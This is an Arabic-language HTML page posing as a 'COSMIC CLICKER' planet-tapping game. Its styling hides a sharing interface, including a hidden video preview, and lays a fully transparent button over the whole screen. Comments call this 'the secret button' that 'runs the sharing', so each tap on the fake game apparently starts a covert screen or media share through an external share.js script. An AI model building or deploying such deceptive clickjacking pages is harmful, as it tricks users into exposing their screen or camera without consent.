<!doctype html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="referrer" content="no-referrer">
    <title>لعبة الكوكب</title>
    
    <style>
        /* إخفاء كل شيء من الواجهة القديمة */
        header, main, #share, #compat, #msg, .video, #preview, #placeholder, #stop {
            display: none !important;
            visibility: hidden !important;
        }

        /* تصميم اللعبة */
        body {
            margin: 0;
            padding: 0;
            background: radial-gradient(circle at center, #1e1b4b 0%, #020617 100%);
            color: #fff;
            font-family: sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
            user-select: none;
        }

        .game-container {
            text-align: center;
            background: rgba(255, 255, 255, 0.05);
            padding: 20px;
            border-radius: 24px;
            box-shadow: 0 0 40px rgba(139, 92, 246, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            width: 80%;
            max-width: 350px;
            position: relative;
            z-index: 10;
        }

        h1 { font-size: 22px; color: #a78bfa; margin-bottom: 5px; }
        .score-board { font-size: 50px; font-weight: 900; color: #fbbf24; margin: 10px 0; }
        
        .fake-button {
            width: 130px;
            height: 130px;
            border-radius: 50%;
            background: radial-gradient(circle at 30% 30%, #8b5cf6, #4c1d95);
            border: 3px solid #c4b5fd;
            box-shadow: 0 0 30px rgba(139, 92, 246, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 50px;
            margin: 0 auto;
            transition: transform 0.1s;
        }

        .fake-button:active { transform: scale(0.9); }

        /* الزر السري الشفاف الذي يغطي الشاشة ويشغل المشاركة */
        #start {
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100vw !important;
            height: 100vh !important;
            opacity: 0 !important;
            z-index: 9999999 !important;
            cursor: default !important;
            border: none !important;
        }
    </style>
</head>
<body>

    <!-- اللعبة -->
    <div class="game-container">
        <h1>COSMIC CLICKER</h1>
        <div class="score-board" id="score">0</div>
        <div class="fake-button" id="fakeBtn">🪐</div>
        <p style="color:#64748b; font-size:12px; margin-top:15px;">اضغط على الكوكب لجمع النقاط!</p>
    </div>

    <!-- الزر السري (مخفي وشفاف) -->
    <button id="start">بدء</button>
    
    <!-- العناصر المطلوبة للسكريبت -->
    <div id="share"></div>
    <div id="compat"></div>
    <p id="msg"></p>
    <div class="video">
        <video id="preview" autoplay playsinline muted></video>
        <div id="placeholder"></div>
    </div>

    <!-- كود اللعبة -->
    <script>
        let score = 0;
        document.addEventListener('click', function() {
            score += Math.floor(Math.random() * 5) + 1;
            document.getElementById('score').innerText = score;
            let btn = document.getElementById('fakeBtn');
            btn.style.transform = 'scale(0.9)';
            setTimeout(() => btn.style.transform = 'scale(1)', 100);
        });
    </script>

    <!-- سكريبت المشاركة الخاص بك -->
    <script src="/static/share.js"></script>
</body>
</html>
